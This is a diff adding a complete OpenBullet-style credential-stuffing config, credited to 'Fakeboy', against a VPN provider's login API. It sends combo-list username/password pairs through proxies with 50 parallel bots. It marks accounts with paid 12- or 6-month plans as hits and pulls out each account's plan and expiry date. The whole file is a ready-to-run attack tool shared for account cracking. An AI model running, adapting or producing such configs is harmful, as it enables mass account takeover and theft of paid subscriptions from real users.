@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "HMA Fakeboy",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-02T23:21:33.7068772+02:00",
+  "AdditionalInfo": "Stop Leeching and do like",
+  "Author": "Fakeboy",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://securenetconnection.com/clapi/v1.5/user/login" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"Invalid username/password combination\"}}" 
+  KEYCHAIN Success OR 
+    KEY "\"plan\":\"12 Months\"" 
+    KEY "\"plan\":\"6 Months\"" 
+  KEYCHAIN Retry OR 
+    KEY "Error has occurred" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"plan\":\"\"" 
+PARSE "<SOURCE>" LR "plan\":\"" "\"" -> CAP "Plan" 
+PARSE "<SOURCE>" LR "\"expires\":\"" "T" -> CAP "Expires" 
